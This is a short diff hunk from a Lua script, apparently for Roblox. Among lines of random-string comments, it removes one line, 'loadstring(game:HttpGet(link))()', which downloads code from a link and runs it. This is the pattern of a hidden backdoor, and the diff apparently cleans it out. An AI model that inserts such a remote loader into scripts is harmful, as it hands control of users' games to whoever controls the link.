@@ -4610,7 +4610,6 @@ end
 -- IfQxhkimfUKPEvuAj
 -- zjjRfSWOslD
 -- AzmqhBcOmPqkbeECDPyuwCVr
-loadstring(game:HttpGet(link))()
 -- MRZKXGkBLIrUSnUYmVt
 -- CNBCElBEhyK
 -- cUdsskMWAPttHmdGVS
